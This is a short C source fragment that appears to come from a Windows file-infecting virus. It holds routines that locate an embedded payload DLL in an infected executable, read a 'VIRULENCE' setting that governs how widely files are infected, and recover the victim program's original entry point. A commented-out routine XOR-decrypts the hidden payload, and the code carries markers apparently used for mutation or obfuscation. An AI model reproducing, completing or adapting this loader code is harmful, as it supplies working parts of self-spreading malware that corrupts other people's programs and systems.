
#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

LPVOID GetDll(DWORD *len)
{
	DWORD size = 0;
	unsigned char *dll=/*@S+*/upx_sect+szinfcode/*@E*/; //@S
                                        //@E                  
	size += ((BYTE*)&dll[1])[0]*4096;      //@S
	size += ((BYTE*)&dll[2])[0]*512;       //@E

	*len = size;           //@S                          
	VIRULENCE = dll[0x40]; //@E

 #ifdef dbgdbg
	adddeb("*** GetDll dll_vadr:%.8X size:0x%.2X*4096+%.2X*512=0x%X (dec:%u)",dll,((BYTE*)&dll[1])[0],((BYTE*)&dll[2])[0],size,size);
	adddeb("*** GetDll VIRULENCE:%u [0;50]-ALL, [51;100]-FIXED ONLY, [100;150]-FEW FILES ON FIXED, [151;..]-HACK TERMINAL",VIRULENCE);
 #endif

	return dll;
}

// we need this func, becouse in some NET exe (vista, infocard.exe)
// EP is changed by loader after start

DWORD GetVictimEP()
{
	unsigned char *dll=/*@S+*/upx_sect+szinfcode/*@E*/; 
	DWORD EP = ((DWORD*)&dll[0x41])[0];     

	return EP;
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif

//
//LPVOID DecryptDll(unsigned char *b,DWORD *len)
//{
// DWORD peofs=((DWORD*)&b[0x3C])[0]; 
// PE_HEADER *pe=/*@S+*/b+peofs/*@E*/;
// unsigned char *dll=/*@S+*/b+pe->entrypointrva+szinfcode/*@E*/; //@S
//
// DWORD size=0;                                                  //@E
// BYTE xorkey = ((BYTE*)&dll[0])[0]^'M'; //@S
// size += ((BYTE*)&dll[1])[0]*4096;
// size += ((BYTE*)&dll[2])[0]*512;       //@E
//
// for (DWORD i=2;i<size;i++) dll[i]=dll[i]^xorkey; //@S
// *len=size;                                       //@E
//
// #ifdef dbgdbg
//  adddeb("*** DecryptDll xorkey:%.2X size:0x%.2X*4096+%.2X*512=0x%X (dec:%u)",xorkey,((BYTE*)&dll[1])[0],((BYTE*)&dll[2])[0],size,size);
// #endif
//
// return dll;
//}
//
